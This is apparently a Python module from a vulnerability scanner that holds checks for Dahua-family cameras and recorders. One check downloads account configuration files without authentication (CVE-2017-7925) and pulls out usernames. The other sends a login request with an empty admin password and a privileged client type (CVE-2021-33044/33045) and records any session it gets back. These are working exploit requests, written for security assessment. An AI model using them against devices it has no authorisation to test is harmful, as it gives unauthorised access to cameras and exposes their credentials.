"""Dahua-family checks (also covers Amcrest, Lorex, Intelbras and other rebadges)."""

from __future__ import annotations

import json
import re

from ..core.models import Confidence, Credential, Finding, Severity
from .base import CheckContext, port_of, register

_CONFIG_PATHS = (
    "/current_config/passwd",
    "/current_config/Account1",
    "/current_config/Account1.backup",
    "/current_config/General",
)

#: client types whose login path skips credential verification on affected firmware
_BYPASS_CLIENT_TYPES = ("NetKeyboard", "Loopback")


@register("dahua_config_disclosure", "CVE-2017-7925 unauthenticated config / credential download")
async def dahua_config_disclosure(ctx: CheckContext) -> list[Finding]:
    """Fetch the account configuration blobs that affected firmware serves anonymously."""
    out: list[Finding] = []
    for base in ctx.bases():
        for path in _CONFIG_PATHS:
            resp = await ctx.probe.get(base + path)
            if resp is None or resp.status_code != 200:
                continue
            body = resp.text
            if len(body) < 16 or "<html" in body[:200].lower():
                continue
            users = _dahua_accounts(body)
            for user in users:
                ctx.device.credentials.append(
                    Credential(
                        username=user,
                        password="<hash recovered from config>",
                        service="http",
                        port=port_of(base),
                        note="recovered via CVE-2017-7925; hash is reversible",
                    )
                )
            out.append(
                ctx.finding(
                    severity=Severity.CRITICAL,
                    confidence=Confidence.CONFIRMED,
                    evidence=(
                        f"unauthenticated download of {path} returned {len(body)} bytes"
                        + (f"; accounts: {', '.join(users)}" if users else "")
                    ),
                    matched_at=base + path,
                    port=port_of(base),
                    tags=["info-leak", "credential-disclosure", "dahua"],
                    extra={"accounts": users},
                )
            )
            return out
    return out


def _dahua_accounts(body: str) -> list[str]:
    names = re.findall(r'"Name"\s*:\s*"([^"]+)"', body)
    names += re.findall(r"table\.Account\d+\.Name=(\S+)", body)
    seen: list[str] = []
    for n in names:
        if n not in seen:
            seen.append(n)
    return seen[:20]


@register("dahua_auth_bypass", "CVE-2021-33044/33045 identity authentication bypass")
async def dahua_auth_bypass(ctx: CheckContext) -> list[Finding]:
    """Request a login with a privileged client type and see whether the device grants it.

    This only performs a login; it changes nothing on the device. A session returned without
    a valid password is positive proof of the bypass.
    """
    out: list[Finding] = []
    for base in ctx.bases():
        for client_type in _BYPASS_CLIENT_TYPES:
            payload = {
                "method": "global.login",
                "params": {
                    "userName": "admin",
                    "password": "",
                    "clientType": client_type,
                    "loginType": "Direct",
                    "authorityType": "Default",
                    "passwordType": "Default",
                },
                "id": 1,
                "session": 0,
            }
            resp = await ctx.probe.post(base + "/RPC2_Login", content=json.dumps(payload).encode(),
                                        headers={"Content-Type": "application/json"})
            if resp is None or resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except Exception:
                continue
            if data.get("result") is True and data.get("session"):
                ctx.device.credentials.append(
                    Credential(
                        username="admin",
                        password="<no password required>",
                        service="http",
                        port=port_of(base),
                        note=f"authentication bypassed via clientType={client_type}",
                    )
                )
                out.append(
                    ctx.finding(
                        severity=Severity.CRITICAL,
                        confidence=Confidence.CONFIRMED,
                        evidence=(
                            f"global.login with clientType={client_type} and an empty password "
                            f"returned an authenticated session ({data.get('session')})"
                        ),
                        matched_at=base + "/RPC2_Login",
                        port=port_of(base),
                        tags=["auth-bypass", "dahua"],
                        extra={"client_type": client_type},
                    )
                )
                return out
            # a device that is patched answers with an error and a realm challenge
            if isinstance(data.get("params"), dict) and data["params"].get("realm"):
                continue
    return out
